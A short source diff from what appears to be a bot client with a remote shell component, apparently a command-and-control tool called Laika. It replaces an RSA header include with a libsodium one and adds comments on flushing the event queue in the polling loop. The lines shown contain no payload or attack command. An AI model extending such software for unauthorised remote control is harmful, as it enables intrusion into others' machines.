@@ -1,5 +1,5 @@
 #include "lmem.h"
-#include "lrsa.h"
+#include "lsodium.h"
 #include "lerror.h"
 #include "bot.h"
 #include "shell.h"
@@ -135,6 +135,7 @@ bool laikaB_poll(struct sLaika_bot *bot, int timeout) {
     struct sLaika_pollEvent *evnt;
     int numEvents;
 
+    /* flush any events prior (eg. made by a task) */
     laikaB_flushQueue(bot);
     evnt = laikaP_poll(&bot->pList, timeout, &numEvents);
 
@@ -155,6 +156,7 @@ _BOTKILL:
     laikaS_kill(&bot->peer->sock);
 LAIKA_TRYEND
 
+    /* flush any events after (eg. made by a packet handler) */
     laikaB_flushQueue(bot);
     return true;
 }
